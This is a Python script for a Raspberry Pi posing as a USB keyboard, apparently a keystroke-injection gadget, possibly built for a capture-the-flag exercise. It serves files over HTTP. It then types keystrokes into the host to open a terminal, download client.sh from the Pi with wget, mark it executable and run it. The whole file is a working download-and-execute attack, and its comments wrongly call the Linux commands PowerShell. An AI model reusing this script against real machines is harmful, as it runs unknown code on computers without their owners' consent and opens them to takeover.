from time import sleep
from datetime import datetime
import threading
import os
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer


timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

# Handles the serial connection between the Pi and the PC
NULL_CHAR = chr(0)
HID_DEVICE = '/dev/hidg0'

# Function to write the report to the HID device
def write_report(report):
    with open(HID_DEVICE, 'rb+') as fd:
        fd.write(report.encode())

# Character map for USB HID codes
CHAR_MAP = {
    'a': (0, 4), 'b': (0, 5), 'c': (0, 6), 'd': (0, 7), 'e': (0, 8), 'f': (0, 9),
    'g': (0, 10), 'h': (0, 11), 'i': (0, 12), 'j': (0, 13), 'k': (0, 14), 'l': (0, 15),
    'm': (0, 16), 'n': (0, 17), 'o': (0, 18), 'p': (0, 19), 'q': (0, 20), 'r': (0, 21),
    's': (0, 22), 't': (0, 23), 'u': (0, 24), 'v': (0, 25), 'w': (0, 26), 'x': (0, 27),
    'y': (0, 28), 'z': (0, 29), '1': (0, 30), '2': (0, 31), '3': (0, 32), '4': (0, 33),
    '5': (0, 34), '6': (0, 35), '7': (0, 36), '8': (0, 37), '9': (0, 38), '0': (0, 39),
    '\n': (0, 40), ' ': (0, 44), '-': (0, 45), '=': (0, 46), '[': (0, 47), ']': (0, 48),
    '\\': (0, 49), ';': (0, 51), "'": (0, 52), ',': (0, 54), '.': (0, 55), '/': (0, 56),
    '`': (0, 53), '!': (2, 30), '@': (2, 31), '#': (2, 32), '$': (2, 33), '%': (2, 34),
    '^': (2, 35), '&': (2, 36), '*': (2, 37), '(': (2, 38), ')': (2, 39), '_': (2, 45),
    '+': (2, 46), '{': (2, 47), '}': (2, 48), '|': (2, 49), ':': (2, 51), '"': (2, 52),
    '<': (2, 54), '>': (2, 55), '?': (2, 56), '~': (2, 53), 'A': (2, 4), 'B': (2, 5),
    'C': (2, 6), 'D': (2, 7), 'E': (2, 8), 'F': (2, 9), 'G': (2, 10), 'H': (2, 11),
    'I': (2, 12), 'J': (2, 13), 'K': (2, 14), 'L': (2, 15), 'M': (2, 16), 'N': (2, 17),
    'O': (2, 18), 'P': (2, 19), 'Q': (2, 20), 'R': (2, 21), 'S': (2, 22), 'T': (2, 23),
    'U': (2, 24), 'V': (2, 25), 'W': (2, 26), 'X': (2, 27), 'Y': (2, 28), 'Z': (2, 29)
}

# Function to convert a string into HID reports
def type_string(input_string):
    with open(HID_DEVICE, 'rb+') as fd:
        for char in input_string:
            if char in CHAR_MAP:
                modifier, keycode = CHAR_MAP[char]
                fd.write((chr(modifier) + NULL_CHAR + chr(keycode) + NULL_CHAR * 5).encode())
                fd.write((NULL_CHAR * 8).encode())
        fd.flush()

# Function to serve files
def start_http_server():
#    os.chdir("/home/pi/CTF_Gadgets")  # Update this path as necessary
    handler = SimpleHTTPRequestHandler
    with TCPServer(("", 8080), handler) as httpd:
        print("Serving HTTP on port 8080...")
        httpd.serve_forever()

# Function to download and execute the file using HID
def run_cmd_and_check_os():
    # Simulate Alt+F2 to open the run prompt or terminal in Linux
    write_report(chr(0x04) + NULL_CHAR + chr(0x3a) + NULL_CHAR * 5)  # Alt + F2
    write_report(NULL_CHAR * 8)  # Release all keys
    sleep(0.3)

    type_string("x-terminal-emulator\n")
    sleep(2)

    # PowerShell command to download and execute
    pi_ip = "10.0.0.1"  # Update with your Pi's IP
    ps_command = f"""
    wget http://{pi_ip}:8080/client.sh -O /tmp/client.sh;
    chmod +x /tmp/client.sh;
    bash /tmp/client.sh;
   
    """
    for line in ps_command.strip().split("\n"):
        type_string(line.strip() + '\n')
        sleep(0.5)

    # Exit PowerShell
    type_string("exit\n")


# Start HTTP server in a thread
server_thread = threading.Thread(target=start_http_server)
server_thread.daemon = True
server_thread.start()

# Run the payload injection
run_cmd_and_check_os()
